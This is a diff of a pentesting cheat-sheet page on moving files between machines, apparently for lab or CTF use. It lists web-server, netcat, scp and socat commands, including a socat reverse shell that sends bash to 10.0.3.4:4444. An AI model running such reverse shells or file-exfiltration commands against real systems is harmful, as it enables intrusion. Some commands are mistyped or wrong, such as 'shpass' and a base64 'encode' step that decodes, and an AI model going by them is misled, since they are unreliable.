@@ -1,73 +1,97 @@
 ---
-description: On Construction
+description: Listeners and binaries
+icon: person-to-portal
 ---
 
-# 🐦 File Transfer
+# File Transfer
 
-**Useful BInaries:**
-
-{% embed url="https://github.com/andrew-d/static-binaries" %}
-
-**Base64**
-
-```bash
-# Pipe to base64:
-cat <file> | base64
-# Save it in to a file
-echo "texto_base_64" | base64 -d > <file>
+{% tabs %}
+{% tab title="Python Web Server" %}
+{% code title="Host" %}
+```sh
+python3 -m http.server
 ```
+{% endcode %}
 
-**Http**
-
-```bash
-# Python
-# Localy: 
-python -m http.server 
-# Remotely:
+{% code title="Client" %}
+```sh
 curl -o IP:Port/file
-
-# Apache
-# localy:
-cp archivo.txt /var/www/html
-# Remotely
-wget IP/Port/file 
-curl -o IP:Port/file
-#Localy
-python -m http.server 80
-#Remotely
 wget <ip>/<archivo>
 ```
+{% endcode %}
+{% endtab %}
 
-**SSH**
-
-```c
-#scapy
-shpass -p <password> scp <filename> admin@2million.htb:/tmp/
-```
-
-**Netcat**
-
-```bash
-# Target Machine
+{% tab title="Netcat" %}
+{% code title="Client" %}
+```sh
 nc <Target_IP> <port> < file
-# Locally
-nc -lvp <Local_IP> > file
+```
+{% endcode %}
 
-#Check hashes to avoid file corruption
-md5sum <file>
-#Use cat command
+{% code title="Host" %}
+```sh
+nc -lvp <Local_IP> > file
+```
+{% endcode %}
+
+{% code title="" %}
+```sh
 cat <file> | nc Target_IP 443
 ```
+{% endcode %}
+{% endtab %}
 
-**Socat**
-
-[socat](http://www.dest-unreach.org/socat/doc/socat.html) is like netcat on steroids and is a very powerfull networking swiss-army knife. Socat can be used to pass full TTY’s over TCP connections.
-
+{% tab title="Apache" %}
 ```
-#Listener:
+cp archivo.txt /var/www/html
+```
+{% endtab %}
+
+{% tab title="SSH" %}
+{% code title="Scapy" %}
+```sh
+shpass -p <password> scp <filename> admin@2million.htb:/tmp/
+```
+{% endcode %}
+{% endtab %}
+
+{% tab title="Socat" %}
+{% code title="Listener" %}
+```sh
 socat file:`tty`,raw,echo=0 tcp-listen:4444
-#Target machine:
-socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
-
-
 ```
+{% endcode %}
+
+{% code title="Target Machine" %}
+```
+socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444
+```
+{% endcode %}
+{% endtab %}
+{% endtabs %}
+
+{% hint style="warning" %}
+* <mark style="color:purple;">Check hashes to avoid file corruption</mark>
+
+```sh
+md5sum <file>
+```
+
+* <mark style="color:purple;">Using</mark> <mark style="color:orange;">**`base64`**</mark> <mark style="color:purple;">help to keep file integrity</mark>
+
+{% code title="Pipe text in to a file" %}
+```sh
+echo "texto_base_64" | base64 -d > <file>
+```
+{% endcode %}
+
+{% code title="Pipe file in to base64" %}
+```sh
+cat <file> | base64 -d > <file>
+```
+{% endcode %}
+{% endhint %}
+
+### <mark style="color:purple;">**Useful Binaries:**</mark>
+
+{% embed url="https://github.com/andrew-d/static-binaries" %}
